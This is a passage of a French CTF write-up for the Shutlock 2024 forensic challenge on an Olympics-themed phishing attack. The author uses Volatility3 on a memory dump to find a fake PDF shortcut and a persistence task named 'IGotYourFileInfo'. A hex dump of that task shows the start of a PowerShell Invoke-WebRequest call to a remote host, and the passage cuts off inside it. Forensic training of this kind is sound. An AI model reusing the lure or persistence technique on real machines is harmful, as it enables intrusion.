4.67843C12.4808 4.5498 11.3488 4.5684 10.3271 4.681C10.2848 4.54257 10.2137 4.40813 10.1111 4.28494C9.90289 4.03513 9.58304 3.87239 9.22517 3.87894C8.72884 3.88801 6.40341 4.02781 3.9777 5.83024C3.85516 5.9213 3.73139 6.04849 3.63825 6.22299C3.38742 6.69289 1.11365 11.0876 1.09774 16.4873C1.09715 16.6871 1.14634 16.9155 1.28416 17.1296C1.58866 17.6027 3.29601 19.9515 7.12649 20.1169C7.50079 20.1331 7.86486 19.9726 8.10512 19.6794C8.2521 19.5 8.63516 19.0311 9.00416 18.5683C9.06865 18.4874 9.12057 18.4028 9.16075 18.316C9.32759 18.3546 9.49869 18.391 9.67405 18.4248L9.67405 18.4248L9.68004 18.426C11.0465 18.681 12.6626 18.7747 14.4312 18.4443C14.5698 18.4206 14.7086 18.3942 14.8477 18.3649Z" stroke="currentColor" stroke-width="2"/></svg></a></span><button id="menu-btn" class="hdr-btn" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
			</div>
		</div>
	</header>
	<div id="mobile-menu" class="animated fast">
		<ul>
			<li><a href="http://localhost:1313/posts/">Articles</a></li>
			<li><a href="http://localhost:1313/categories/">Catégories</a></li>
			<li><a href="http://localhost:1313/apropos">A propos</a></li>
		</ul>
	</div>


	<main class="site-main section-inner animated fadeIn faster"><article class="thin">
			<header class="post-header">
				<div class="post-meta"><span>12 Jul, 2024</span></div>
				<h1>Shutlock 2024 - Enquête sur le phishing des JO : Retracer l&#39;attaque 1/2</h1>
			</header>
			<div class="post-info"><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-feather"><path d="M20.24 12.24a6 6 0 0 0-8.49-8.49L5 10.5V19h8.5z"></path><line x1="16" y1="8" x2="2" y2="22"></line><line x1="17.5" y1="15" x2="9" y2="15"></line></svg><a href="" target="_blank">Onirix</a></p>
<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="http://localhost:1313/tags/shutlock-2024">Shutlock 2024</a></span><span class="tag"><a href="http://localhost:1313/tags/forensic">Forensic</a></span><span class="tag"><a href="http://localhost:1313/tags/phishing-1/2">Phishing 1/2</a></span><span class="tag"><a href="http://localhost:1313/tags/write-up">Write-Up</a></span></p>
<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg><span class="category"><a href="http://localhost:1313/categories/ctf">CTF</a></span></p>
<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>
    Temps de lecture:
    
    
    
    9 Minutes, 18 Seconds</p>
<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>12-07-2024</p></div>
			<hr class="post-end">
			<div class="content">
				<div>
  <img src="/posts/shutlock2024_phishing_1-2/images/shutlock.png" alt="Logo_Shutlock">
</div>
<p>Ceci est le write-up de la première partie du challenge Forensic <strong>Enquête sur le phishing des JO</strong> du CTF <a href="https://shutlock.fr/">Shutlock</a> édition 2024 organisé par la DGSI et EPITA.</p>
<h2 id="énoncé">Énoncé<a href="#énoncé" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Mike O&#39;Soft a été averti d&#39;une campagne de phishing par le groupe THE HAMOR. Une des personnes ayant reçu le mail de phishing en question, s&#39;est faite piegée.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Vous avez pour mission de mener l&#39;enquête. Heureusement pour vous, les équipes du ministère ont réalisé un dump mémoire sur la machine. Dans la suite de votre enquête, un dump réseau vous sera confié.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Sauriez-vous retracer ce qu&#39;il s&#39;est passé sur ce poste ?
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Pour résoudre ce challenge, vous devez répondre aux questions suivantes :
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">1 - Quel est le nom du raccourci malveillant ?
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">2 - Quel est le nom de la scheduled task créé ?
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3 - Quel script est lancé par cette scheduled task ?
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Format du flag SHLK{&#39;nom-fichier&#39;-&#39;scheduled task-&#39;script&#39;}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Exemple:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">1 - File : ctf\shutlock.test
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">2 - scheduled task : ScheduleTaskName
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3 - script : ThisIsTheScript.sh
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SHLK{shutlock.test-ScheduleTaskName-ThisIsTheScript.sh}
</span></span></code></pre></div><p>Il nous est alors donné un dump mémoire (<strong>dump.raw</strong>) ainsi que le screenshot du bureau du PC ci-dessous:</p>
<div>
  <img src="/posts/shutlock2024_phishing_1-2/images/Ordi.png" alt="Ordi.png">
</div>
<hr>
<h2 id="investigation">Investigation<a href="#investigation" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<p>D&rsquo;après l&rsquo;énoncé, on sait que la personne à ouvert un mail contenant un raccourcis piégé, raccourcis qui a créé une tâche planifiée lançant un script malveillant.</p>
<p>D&rsquo;après le screenshot, le raccourcis serait lié à un PDF de tirage au sort pour les JO 2024 situé dans le dossier <strong>Downloads</strong>.</p>

    <aside class="admonition note">
        <div class="admonition-title">
            <div class="icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-edit-2"><path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"></path></svg></div><b>Note</b>
        </div>
        <div class="admonition-content">Je vais ici utiliser <a href="https://github.com/volatilityfoundation/volatility3">Volatility3</a> pour parcourir la mémoire.</div>
    </aside>
<p>Avant de commencer l&rsquo;investigation en elle-même, il est important de déterminer l&rsquo;OS du PC.</p>
<h3 id="déterminer-los">Déterminer l&rsquo;OS<a href="#déterminer-los" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
<p>On va commencer par vérifier si le PC tourne sous Windows, car c&rsquo;est l&rsquo;OS plus courant (en CTF comme dans la réalité).</p>
<p>On utilise alors la commande <code>windows.info</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo vol -f dump.raw windows.info
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Volatility <span class="m">3</span> Framework 2.5.2
</span></span><span class="line"><span class="cl">Progress:  100.00               PDB scanning finished                                                                                              
</span></span><span class="line"><span class="cl">Variable        Value
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Kernel Base     0xf80479000000
</span></span><span class="line"><span class="cl">DTB     0x1aa000
</span></span><span class="line"><span class="cl">Symbols file:///usr/lib/python3.12/site-packages/volatility3/symbols/windows/ntkrnlmp.pdb/C7DF30B22252078525B414CC51B257D3-1.json.xz
</span></span><span class="line"><span class="cl">Is64Bit True
</span></span><span class="line"><span class="cl">IsPAE   False
</span></span><span class="line"><span class="cl">layer_name      <span class="m">0</span> WindowsIntel32e
</span></span><span class="line"><span class="cl">memory_layer    <span class="m">1</span> FileLayer
</span></span><span class="line"><span class="cl">KdVersionBlock  0xf80479c0f400
</span></span><span class="line"><span class="cl">Major/Minor     15.19041
</span></span><span class="line"><span class="cl">MachineType     <span class="m">34404</span>
</span></span><span class="line"><span class="cl">KeNumberProcessors      <span class="m">6</span>
</span></span><span class="line"><span class="cl">SystemTime      2024-06-07 19:33:51
</span></span><span class="line"><span class="cl">NtSystemRoot    C:<span class="se">\W</span>indows
</span></span><span class="line"><span class="cl">NtProductType   NtProductWinNt
</span></span><span class="line"><span class="cl">NtMajorVersion  <span class="m">10</span>
</span></span><span class="line"><span class="cl">NtMinorVersion  <span class="m">0</span>
</span></span><span class="line"><span class="cl">PE MajorOperatingSystemVersion  <span class="m">10</span>
</span></span><span class="line"><span class="cl">PE MinorOperatingSystemVersion  <span class="m">0</span>
</span></span><span class="line"><span class="cl">PE Machine      <span class="m">34404</span>
</span></span><span class="line"><span class="cl">PE TimeDateStamp        Thu Apr <span class="m">13</span> 14:51:37 <span class="m">2062</span>
</span></span></code></pre></div><p>On apprend alors que le PC est sous Windows 10 ainsi que d&rsquo;autres informations comme la date système (donc du dump), etc.</p>
<p>Si cette commande n&rsquo;avait rien donné on aurait pu essayer d&rsquo;extraire une bannière Linux avec la commande <code>banners</code>.</p>
<h3 id="extraction-des-objets-courants">Extraction des objets courants<a href="#extraction-des-objets-courants" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
<p>Maintenant que nous sommes certain de l&rsquo;OS utilisé, on va pouvoir commencer l&rsquo;analyse, afin de me faciliter la tâche pour plus tard, j&rsquo;extrais le résultat de <code>filescan</code>, <code>cmdline</code>, <code>pstree</code> et <code>netscan</code> dans des fichiers.</p>
<pre tabindex="0"><code>sudo vol -f dump.raw windows.filescan &gt; filescan
sudo vol -f dump.raw windows.cmdline &gt; cmdline
sudo vol -f dump.raw windows.pstree &gt; pstree
sudo vol -f dump.raw windows.netscan &gt; netscan
</code></pre><p>Cela me permet de gagner en rapidité en faisant un <code>grep</code> dans le fichier plutôt que de lancer une extraction à chaque fois.</p>
<h3 id="flag-13---raccourcis-malveillant">Flag 1/3 - Raccourcis malveillant<a href="#flag-13---raccourcis-malveillant" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
<p>La première partie du flag est le nom du raccourcis malveillant, sur Windows, les raccourcis ont comme extension <code>.lnk</code>, c&rsquo;est donc ce que je vais chercher dans le fichier <code>filescan</code> créé précédemment:</p>
<pre tabindex="0"><code>cat filescan | grep &#34;.lnk&#34;
0xa70451a45a80  \Users\clara\Downloads\Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024\Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf.lnk  216
0xa7045384fe90  \Users\clara\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\File Explorer.lnk       216
</code></pre><p>Tiens, un raccourcis en .pdf.lnk dans le dossier <strong>Downloads</strong> !</p>
<p>On a maintenant la première partie du flag: <strong>Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf.lnk</strong></p>
<p>On peut essayer de l&rsquo;extraire et voir ou il mène (avec <a href="https://github.com/Matmaus/LnkParse3">LnkParse3</a> sous Linux) mais il n&rsquo;y a pas de lien de redirection dans le fichier.</p>
<h3 id="flag-23---tâche-planifiée">Flag 2/3 - Tâche planifiée<a href="#flag-23---tâche-planifiée" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
<p>Les tâches planifiées sous Windows ne sont pas présentes sous forme de fichier mais dans les registres aux adresses suivantes:</p>
<pre tabindex="0"><code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tree
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tasks
</code></pre><p>Le premier registre contient la <strong>liste</strong> des tâches planifiées et le second leur <strong>contenu</strong> (Actions, Author, URL, Trigger, etc).</p>
<p>On va donc afficher la liste des ruches disponibles avec la commande <code>windows.registry.hivelist</code>:</p>
<pre tabindex="0"><code>sudo vol -f dump.raw windows.registry.hivelist

Volatility 3 Framework 2.5.2
Progress:  100.00               PDB scanning finished                        
Offset  FileFullPath    File output

0xb9044f873000          Disabled
0xb9044f889000  \REGISTRY\MACHINE\SYSTEM        Disabled
0xb9044fc80000  \REGISTRY\MACHINE\HARDWARE      Disabled
0xb90450c50000  \SystemRoot\System32\Config\SECURITY    Disabled
0xb90450c52000  \SystemRoot\System32\Config\SAM Disabled
0xb90450c56000  \SystemRoot\System32\Config\DEFAULT     Disabled
0xb90450c0f000  \SystemRoot\System32\Config\SOFTWARE    Disabled
0xb9045317d000  \Device\HarddiskVolume1\Boot\BCD        Disabled
0xb9045c3b6000  \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT        Disabled
0xb90453321000  \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT  Disabled
0xb90453323000  \SystemRoot\System32\Config\BBI Disabled
0xb90454d3d000  \??\C:\Windows\AppCompat\Programs\Amcache.hve   Disabled
0xb90454e10000  \??\C:\Users\clara\ntuser.dat   Disabled
0xb90454e20000  \??\C:\Users\clara\AppData\Local\Microsoft\Windows\UsrClass.dat Disabled
0xb90456305000  \??\C:\ProgramData\Microsoft\Windows\AppRepository\Packages\MicrosoftWindows.Client.CBS_1000.19053.1000.0_x64__cw5n1h2txyewy\ActivationStore.dat        Disabled
0xb904561ee000  \??\C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.Windows.StartMenuExperienceHost_10.0.19041.3636_neutral_neutral_cw5n1h2txyewy\ActivationStore.dat Disabled
0xb904561e1000  \??\C:\Users\clara\AppData\Local\Packages\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\Settings\settings.dat Disabled
0xb90456571000  \??\C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.Windows.Search_1.14.10.19041_neutral_neutral_cw5n1h2txyewy\ActivationStore.dat    Disabled
0xb9045657c000  \??\C:\Users\clara\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\Settings\settings.dat  Disabled
...
</code></pre><p>On en a pas mal mais celle qui nous intéresse est la <strong>Software</strong> (<code>0xb90450c0f000  \SystemRoot\System32\Config\SOFTWARE</code>).</p>
<p>On va donc naviguer à travers cette dernière jusqu&rsquo;a arriver à l&rsquo;adresse <strong>&hellip;\TaskCache\Tree</strong>, qui contient la liste des tâches planifiées, pour ensuite afficher ses clés:</p>
<pre tabindex="0"><code>sudo vol -f dump.raw windows.registry.printkey.PrintKey --offset 0xb90450c0f000 --key &#39;Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree&#39;

Volatility 3 Framework 2.5.2
Progress:  100.00               PDB scanning finished                        
Last Write Time Hive Offset     Type    Key     Name    Data    Volatile

2024-06-07 19:30:24.000000      0xb90450c0f000  Key     \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree        IGotYourFileInfo                False
2019-12-07 09:18:13.000000      0xb90450c0f000  Key     \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree        Microsoft               False
2023-12-04 20:41:13.000000      0xb90450c0f000  Key     \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree        MicrosoftEdgeUpdateTaskMachineCore              False
2023-12-04 20:41:13.000000      0xb90450c0f000  Key     \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree        MicrosoftEdgeUpdateTaskMachineUA                False
2024-01-11 20:51:18.000000      0xb90450c0f000  Key     \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree        npcapwatchdog           False
2023-12-04 20:50:33.000000      0xb90450c0f000  Key     \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree        OneDrive Reporting Task-S-1-5-21-1569816960-1500504362-1823058107-1000            False
2024-06-05 20:33:34.000000      0xb90450c0f000  Key     \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree        OneDrive Standalone Update Task-S-1-5-21-1569816960-1500504362-1823058107-1000            False
2024-06-07 19:30:24.000000      0xb90450c0f000  REG_BINARY      \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree        SD      &#34;
...
</code></pre><p>Le décalage indiqué avec <code>--offset</code> correspond à l&rsquo;adresse de la ruche <code>\SystemRoot\System32\Config\SOFTWARE</code> comme vu plus haut.</p>
<p>On a une tâche qui saute aux yeux, il s&rsquo;agit de <strong>IGotYourFileInfo</strong>, c&rsquo;est la deuxième partie du flag.</p>
<h3 id="flag-33---script">Flag 3/3 - Script<a href="#flag-33---script" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
<p>Pour la dernière partie du flag, il faut trouver le nom du script lancé par la tâche planifiée <strong>IGotYourFileInfo</strong>.</p>
<p>Comme vu plus haut, le registre <strong>Tree</strong> stock la liste des tâches planifiées, chaque tâche à une sous-clé ID (par exemple <strong>{6078ADB5-6D31-4965-AC02-A716F3DC7ADB}</strong>) qui permet de l&rsquo;identifier dans le registre <strong>Tasks</strong>.</p>
<p>Malheureusement l&rsquo;extraction des sous-clés de la tâche avec la commande <code>sudo vol -f dump.raw windows.registry.printkey.PrintKey --offset 0xb90450c0f000 --key 'Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\IGotYourFileInfo'</code> ne donne rien, j&rsquo;ai donc du extraire toutes les clés et sous clés du registre <strong>Tasks</strong> avec la fonction <strong>recurse</strong> dans un fichier et l&rsquo;analyser à la main.</p>
<p>Pour faire ça, j&rsquo;ai utilisé la commande suivante: <code>sudo vol -f dump.raw windows.registry.printkey.PrintKey --offset 0xb90450c0f000 --key 'Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks' --recurse &gt; printkey</code>.</p>
<p>Ensuite, il faut ouvrir le fichier <strong>printkey</strong> dans une éditeur de texte et rechercher la tâche <strong>IGotYourFileInfo</strong>, ce qui nous donne tout ça:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">2024-06-07 19:30:25.000000 	0xb90450c0f000	Key	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks	{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}		False
</span></span><span class="line"><span class="cl">* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_SZ	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	Path	&#34;\IGotYourFileInfo&#34;	False
</span></span><span class="line"><span class="cl">* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_BINARY	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	Hash	&#34;
</span></span><span class="line"><span class="cl">86 0f fd 71 5f 13 18 7a	...q_..z
</span></span><span class="line"><span class="cl">33 f3 ad 14 d2 54 f2 c5	3....T..
</span></span><span class="line"><span class="cl">ae c4 22 6f 15 ac 09 c4	..&#34;o....
</span></span><span class="line"><span class="cl">bf ac 99 88 be 18 ce c7	........&#34;	False
</span></span><span class="line"><span class="cl">* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_DWORD	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	Schema	65538	False
</span></span><span class="line"><span class="cl">* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_SZ	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	Date	&#34;2024-06-07T21:30:24&#34;	False
</span></span><span class="line"><span class="cl">* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_SZ	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	Author	&#34;DEANGILMOR\clara&#34;	False
</span></span><span class="line"><span class="cl">* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_SZ	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	URI	&#34;\IGotYourFileInfo&#34;	False
</span></span><span class="line"><span class="cl">* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_BINARY	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	Triggers	&#34;
</span></span><span class="line"><span class="cl">17 00 00 00 00 00 00 00	........
</span></span><span class="line"><span class="cl">01 07 06 00 00 00 07 00	........
</span></span><span class="line"><span class="cl">00 fc cc d9 21 b9 da 01	....!...
</span></span><span class="line"><span class="cl">00 07 06 00 00 00 07 00	........
</span></span><span class="line"><span class="cl">ff ff ff ff ff ff ff ff	........
</span></span><span class="line"><span class="cl">38 21 41 42 48 48 48 48	8!ABHHHH
</span></span><span class="line"><span class="cl">09 df 08 16 48 48 48 48	....HHHH
</span></span><span class="line"><span class="cl">0e 00 00 00 48 48 48 48	....HHHH
</span></span><span class="line"><span class="cl">41 00 75 00 74 00 68 00	A.u.t.h.
</span></span><span class="line"><span class="cl">6f 00 72 00 00 00 48 48	o.r...HH
</span></span><span class="line"><span class="cl">00 00 00 00 48 48 48 48	....HHHH
</span></span><span class="line"><span class="cl">00 48 48 48 48 48 48 48	.HHHHHHH
</span></span><span class="line"><span class="cl">00 48 48 48 48 48 48 48	.HHHHHHH
</span></span><span class="line"><span class="cl">01 00 00 00 48 48 48 48	....HHHH
</span></span><span class="line"><span class="cl">1c 00 00 00 48 48 48 48	....HHHH
</span></span><span class="line"><span class="cl">01 05 00 00 00 00 00 05	........
</span></span><span class="line"><span class="cl">15 00 00 00 80 81 91 5d	.......]
</span></span><span class="line"><span class="cl">2a e1 6f 59 bb a8 a9 6c	*.oY...l
</span></span><span class="line"><span class="cl">e8 03 00 00 48 48 48 48	....HHHH
</span></span><span class="line"><span class="cl">22 00 00 00 48 48 48 48	&#34;...HHHH
</span></span><span class="line"><span class="cl">44 00 45 00 41 00 4e 00	D.E.A.N.
</span></span><span class="line"><span class="cl">47 00 49 00 4c 00 4d 00	G.I.L.M.
</span></span><span class="line"><span class="cl">4f 00 52 00 5c 00 63 00	O.R.\.c.
</span></span><span class="line"><span class="cl">6c 00 61 00 72 00 61 00	l.a.r.a.
</span></span><span class="line"><span class="cl">00 00 48 48 48 48 48 48	..HHHHHH
</span></span><span class="line"><span class="cl">2c 00 00 00 48 48 48 48	,...HHHH
</span></span><span class="line"><span class="cl">58 02 00 00 10 0e 00 00	X.......
</span></span><span class="line"><span class="cl">80 f4 03 00 ff ff ff ff	........
</span></span><span class="line"><span class="cl">07 00 00 00 00 00 00 00	........
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00	........
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00	........
</span></span><span class="line"><span class="cl">00 00 00 00 48 48 48 48	....HHHH
</span></span><span class="line"><span class="cl">dd dd 00 00 00 00 00 00	........
</span></span><span class="line"><span class="cl">01 07 06 00 00 00 07 00	........
</span></span><span class="line"><span class="cl">00 fc cc d9 21 b9 da 01	....!...
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00	........
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00	........
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00	........
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00	........
</span></span><span class="line"><span class="cl">10 0e 00 00 00 00 00 00	........
</span></span><span class="line"><span class="cl">ff ff ff ff 00 00 00 00	........
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00	........
</span></span><span class="line"><span class="cl">00 01 5a 2b 01 00 00 00	..Z+....
</span></span><span class="line"><span class="cl">00 00 00 00 9f 68 00 00	.....h..
</span></span><span class="line"><span class="cl">00 00 00 00 48 48 48 48	....HHHH&#34;	False
</span></span><span class="line"><span class="cl">* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_BINARY	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	Actions	&#34;
</span></span><span class="line"><span class="cl">03 00 0c 00 00 00 41 00	......A.
</span></span><span class="line"><span class="cl">75 00 74 00 68 00 6f 00	u.t.h.o.
</span></span><span class="line"><span class="cl">72 00 66 66 00 00 00 00	r.ff....
</span></span><span class="line"><span class="cl">22 00 00 00 49 00 6e 00	&#34;...I.n.
</span></span><span class="line"><span class="cl">76 00 6f 00 6b 00 65 00	v.o.k.e.
</span></span><span class="line"><span class="cl">2d 00 57 00 65 00 62 00	-.W.e.b.
</span></span><span class="line"><span class="cl">52 00 65 00 71 00 75 00	R.e.q.u.
</span></span><span class="line"><span class="cl">65 00 73 00 74 00 f4 00	e.s.t...
</span></span><span class="line"><span class="cl">00 00 2d 00 55 00 72 00	..-.U.r.
</span></span><span class="line"><span class="cl">69 00 20 00 68 00 74 00	i...h.t.
</span></span><span class="line"><span class="cl">74 00 70 00 3a 00 2f 00	t.p.:./.
